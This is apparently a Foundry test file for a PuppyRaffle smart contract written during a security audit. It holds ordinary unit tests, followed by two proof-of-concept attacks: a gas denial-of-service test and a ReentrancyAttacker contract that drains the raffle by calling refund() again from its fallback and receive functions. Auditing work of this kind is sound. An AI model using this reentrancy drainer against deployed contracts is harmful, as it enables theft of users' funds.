// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    // @audit-test PoC to show potential DoS attack
    function test_enter_raffle_for_dos () public {
        // set the gas price to be equivalent to normal transactions:
        vm.txGasPrice(1); 

        // generate first 1000 different addresses and enter the raffle
        uint256 gas_required_to_generate_addresses = gasleft();
        uint256 players_num = 1000;
        address[] memory players = new address[](players_num);
        for (uint256 i = 0; i < players_num; i++) {
            players[i] = address(uint160(i));
        }
        uint256 gas_cost_to_generate_addresses = gas_required_to_generate_addresses - gasleft();
        console.log("Gas required to spawn first %s addresses is: %s", players_num, gas_cost_to_generate_addresses);
        // enter the raffle for the first 1000 addresses
        uint256 gas_start_first = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 1000}(players);
        uint256 gas_cost_first = gas_start_first - gasleft();
        console.log("Gas required for first 1000 addresses to enter the raffle: %s", gas_cost_first);
        console.log("Effective Gas Price for first call is: %s", gas_cost_first * tx.gasprice);
        // Gas required for 1000 addresses to enter the raffle: 417422148
        // The gas required to complete this operation takes 417 million gas, whereas the block gas limit for ethereum is ~ 15 million.

        // generate second 1000 different addresses and enter the raffle
        gas_required_to_generate_addresses = gasleft();
        address[] memory players_two = new address[](players_num);
        for (uint256 i = 0; i < players_num; i++) {
            players_two[i] = address(uint160(i+1000));
        }
        gas_cost_to_generate_addresses = gas_required_to_generate_addresses - gasleft();
        console.log("Gas required to spawn second %s addresses is: %s", players_num, gas_cost_to_generate_addresses);
        // enter the raffle for the second 1000 addresses
        uint256 gas_start_second = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 1000}(players_two);
        uint256 gas_cost_second = gas_start_second - gasleft();
        console.log("Gas required for second 1000 addresses to enter the raffle: %s", gas_cost_second);
        console.log("Effective Gas Price for second call is: %s", gas_cost_second * tx.gasprice);
        // The gas required to complete this operation takes 1.6 billion gas

        assert(gas_cost_first < gas_cost_second);
    }

    // @audit-test Test the reentrancy in refund function
    function test_reentrancy_refund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attacker_contract = new ReentrancyAttacker(puppyRaffle);
        address attack_user = makeAddr("attacker");
        vm.deal(attack_user, 1 ether); // signature of deal method is `deal(address to, uint256 give)`

        uint256 attacker_contract_balance_before = address(attacker_contract).balance;
        uint256 raffle_contract_balance_before = address(puppyRaffle).balance;

        // attack phase
        vm.prank(attack_user);
        attacker_contract.enter_raffle_and_attack{ value: entranceFee }(); // call the function and pass the value of entranceFee for one user to enter the raffle

        uint256 raffle_contract_balance_after = address(puppyRaffle).balance;
        uint256 attacker_contract_balance_after = address(attacker_contract).balance;

        console.log("Address of raffle contract is: %s", address(puppyRaffle));
        console.log("Address of attack contract is: %s", address(attacker_contract));
        console.log("Address of attack user is: %s", address(attack_user));
        console.log("The raffle contract had initial balance of %s and the final balanace is %s", raffle_contract_balance_before, raffle_contract_balance_after);
        console.log("The attacker contract had initial balance of %s and the final balanace is %s", attacker_contract_balance_before, attacker_contract_balance_after);
    }
}

contract ReentrancyAttacker {
    PuppyRaffle puppy_raffle_victim;
    uint256 entrance_fee;
    uint256 attacker_index;

    constructor (PuppyRaffle _victim) {
        puppy_raffle_victim = _victim;
    }

    function enter_raffle_and_attack () external payable {
        // enter the raffle
        entrance_fee = puppy_raffle_victim.entranceFee();
        address[] memory attacker = new address[](1);
        attacker[0] = address(this); // this stores the address of the `attacker_contract` that is defined in the `test_reentrancy_refund` function
        puppy_raffle_victim.enterRaffle{value: entrance_fee}(attacker);
        // start the reentrancy attack
        attacker_index = puppy_raffle_victim.getActivePlayerIndex(address(this));
        puppy_raffle_victim.refund(attacker_index);
    }

    function _steal () internal {
        if (address(puppy_raffle_victim).balance >= entrance_fee) {
            puppy_raffle_victim.refund(attacker_index);
        }
    }

    fallback () external payable {
        _steal();
    }

    receive () external payable {
        _steal();
    }
}
